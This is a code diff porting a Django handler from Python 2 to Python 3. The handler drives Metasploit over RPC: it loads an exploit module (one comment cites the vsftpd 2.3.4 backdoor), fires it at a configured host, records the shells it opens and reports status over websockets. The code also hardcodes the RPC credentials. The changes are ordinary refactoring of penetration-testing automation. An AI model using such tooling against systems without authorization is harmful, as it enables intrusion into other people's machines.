@@ -1,8 +1,9 @@
 import time
 import json
-from metasploit.msfrpc import MsfRpcClient
+from .msf_rpc_client import CustomMsfRpcClient
 from .models import Config_exploit
-from channels import Group
+from channels.layers import get_channel_layer
+from asgiref.sync import async_to_sync
 
 from .models import Config_exploit,Exploiated_system,Job
 
@@ -27,27 +28,25 @@ class MSF_rpc_Hhandler(object):
             config_exploit_name = config_exploit_name.encode("UTF8")
             config_exploit_name = config_exploit_name.replace(" ","")
 
-            print config_host_name
-            print config_exploit_name
+            print(config_host_name)
+            print(config_exploit_name)
         try:
-            client = MsfRpcClient("123",server="127.0.0.1",ssl=False)
+            client = CustomMsfRpcClient("msf", "password", host="127.0.0.1", port=55553)
             print (" [ Exploit ] Rpc server  connected ")
         except Exception as e:
             job.exploit_lock = "no"
             job.save()
             print (" [ Exploit ] Rpc server not connected ")
-            Group('pool').send({
-                    "text": json.dumps({
+            self.send_message_to_group('pool', {
                         "action": "exploiting_remort_host",
                         "msf_exploit_current_status":  "\n xerror@w11:~> Metasploit Connection Not succesfuull \n",
                         "job_status": "Error",
                         "job_id": config_cve_number,
                            })
-                       })
         else:
             try:
                 
-                print config_exploit_name
+                print(config_exploit_name)
 
                 exploit = client.modules.use('exploit',config_exploit_name) #'unix/ftp/vsftpd_234_backdoor'
                 # exploit = client.modules.use('exploit','unix/ftp/vsftpd_234_backdoor') #
@@ -65,38 +64,36 @@ class MSF_rpc_Hhandler(object):
                     # rhost_expl  = exploit.execute(payload='cmd/unix/interact')
                     
                     print (" [ Exploit ] Setting following Payload  ")
-                    print exploit.payloads[0]
+                    print(exploit.payloads[0])
                     rhost_expl  = exploit.execute(payload=exploit.payloads[0])
 
                     time.sleep(20)
                 except Exception as e:
                     job.exploit_lock = "no"
                     job.save()
-                    Group('pool').send({
-                        "text": json.dumps({
+                    self.send_message_to_group('pool', {
                         "action": "exploiting_remort_host",
                         "msf_exploit_current_status":  "\n xerror@w11:~> Metasploit Exploit Payload ERROR Binding  \n",
                         "job_status": "Payload Error",
                         "job_id": config_cve_number,
                            })
-                       })
                 else:
                     print (" [ Exploit ] Exploited EXecuted successfully  ")
-                    print rhost_expl
-                    print(28*"*")
+                    print(rhost_expl)
+                    print((28*"*"))
                     exploit_msf_job_id = rhost_expl['job_id']
 
                     if exploit_msf_job_id != None: 
-                        print " [ Exploit ] if Eploit/job id have not none"
+                        print(" [ Exploit ] if Eploit/job id have not none")
 
                         try:
                             exploit_msf_job_uuid        = rhost_expl['uuid']
                             exploit_msf_session_list    =  client.sessions.list
-                            print client.sessions.list
+                            print(client.sessions.list)
 
                             # parse the sessoin list dataea
                             sessoin_data_parsed = self.exploit_sesion_list_parser( exploit_msf_job_uuid , exploit_msf_session_list )
-                            print " [ Exploit ]  System Exploited checking sesion dtail "
+                            print(" [ Exploit ]  System Exploited checking sesion dtail ")
                             exploited_session_detail =  Exploiated_system()
 
                             exploited_session_detail.host_name      = config_host_name
@@ -108,7 +105,7 @@ class MSF_rpc_Hhandler(object):
                             exploited_session_detail.exploit_rport      =  config_rport
                            
                             if sessoin_data_parsed :
-                                print " [ Exploit ]  System session found and saved  "
+                                print(" [ Exploit ]  System session found and saved  ")
                                 exploited_session_detail.session_id     = sessoin_data_parsed['session_id']
                                 exploited_session_detail.exploit_uuid   = sessoin_data_parsed['exploit_uuid']
                                 exploited_session_detail.session_type   = sessoin_data_parsed['exploit_type']
@@ -116,15 +113,13 @@ class MSF_rpc_Hhandler(object):
                                 exploited_session_detail.save()
                                 job.exploit_status = "Exploited/sessioned"
 
-                                Group('pool').send({
-                                   "text": json.dumps({
+                                self.send_message_to_group('pool', {
                                     "action": "exploiting_remort_host",
                                     "msf_exploit_current_status":  "\n xerror@w11:~> Remote system exploited and Session was created  \n",
                                     "job_status": "sessioned",
-                                    "sessions" : client.sessions.list.keys(),
+                                    "sessions" : list(client.sessions.list.keys()),
                                     "job_id": config_cve_number,
                                        })
-                                   })
 
                             else:
                                 job.exploit_status = "Exploited only"
@@ -136,17 +131,15 @@ class MSF_rpc_Hhandler(object):
                                 exploited_session_detail.save()
 
 
-                                print " [ Exploit ]  System session not found and exploit detail saved  "
+                                print(" [ Exploit ]  System session not found and exploit detail saved  ")
                                 exploited_session_detail.save()
-                                Group('pool').send({
-                                   "text": json.dumps({
+                                self.send_message_to_group('pool', {
                                     "action": "exploiting_remort_host",
                                     "msf_exploit_current_status":  "\n xerror@w11:~> exploitaiton Complteted but no Session was created  \n",
                                     "job_status": "Exploited only",
-                                    "sessions" : client.sessions.list.keys(),
+                                    "sessions" : list(client.sessions.list.keys()),
                                     "job_id": config_cve_number,
                                        })
-                                   })
                             job.exploit_lock = "no"
                             job.save()
 
@@ -154,44 +147,38 @@ class MSF_rpc_Hhandler(object):
                             # print client.sessions.list
 
                         except Exception as e:
-                            print " [ Exploit ]  session erro"
-                            print e
+                            print(" [ Exploit ]  session erro")
+                            print(e)
 
                             job.exploit_lock = "no"
                             job.save()
 
-                            Group('pool').send({
-                                "text": json.dumps({
+                            self.send_message_to_group('pool', {
                                 "action": "exploiting_remort_host",
                                 "msf_exploit_current_status":  "\n xerror@w11:~> After exploitaiton session hanve error   \n",
                                 "job_status": "Exploited",
                                 "job_id": config_cve_number,
                                    })
-                               })
 
                     else:
                         job.exploit_status = "not_exploited "
                         job.exploit_lock = "no"
                         job.save()
-                        Group('pool').send({
-                        "text": json.dumps({
+                        self.send_message_to_group('pool', {
                             "action": "exploiting_remort_host",
                             "msf_exploit_current_status":  "\n xerror@w11:~> Remote system Exploitation not Succesfull   \n",
                             "job_status": "Not Exploited",
                             "job_id": config_cve_number,
                                })
-                           })
 
             except Exception as e:
                 job.exploit_lock = "no"
                 job.save()
-                Group('pool').send({
-                    "text": json.dumps({
-                        "action": "exploiting_remort_host",
-                        "msf_exploit_current_status":  "\n xerror@w11:~> Metasploit Exploiation Process ERROR  \n",
-                        "job_status": "Exploiation Error",
-                        "job_id": config_cve_number,
-                           })
+                self.send_message_to_group('pool', {
+                    "action": "exploiting_remort_host",
+                    "msf_exploit_current_status":  "\n xerror@w11:~> Metasploit Exploiation Process ERROR  \n",
+                    "job_status": "Exploiation Error",
+                    "job_id": config_cve_number,
                        })
 
 
@@ -199,18 +186,21 @@ class MSF_rpc_Hhandler(object):
 
         sessoin_dict = sessoin_list
         temp_dict = {}
-        for key in sessoin_dict.keys():
+        for key in list(sessoin_dict.keys()):
             temp_obj = sessoin_dict[key]
             if temp_obj['exploit_uuid']  == uuid :
                 temp_dict['target_host']  = temp_obj['target_host']
                 temp_dict['session_id']   = str(key)
                 temp_dict['exploit_uuid'] = temp_obj['exploit_uuid']
-                temp_dict['exploit_type'] = temp_obj['type']
+                if 'type' in temp_obj:
+                    temp_dict['exploit_type'] = temp_obj['type']
+                else:
+                    temp_dict['exploit_type'] = None  # Valeur par défaut si la clé est absente
                 temp_dict['tunnel_peer']  = temp_obj['tunnel_peer']
-                print " [ Exploit ]  session uuid found"
-            print " [ Exploit ]  session uuid checking"
+                print(" [ Exploit ]  session uuid found")
+            print(" [ Exploit ]  session uuid checking")
 
-        print " [ Exploit ] session uuid data"
+        print(" [ Exploit ] session uuid data")
         # print temp_dict
 
         if len(temp_dict) == 0:
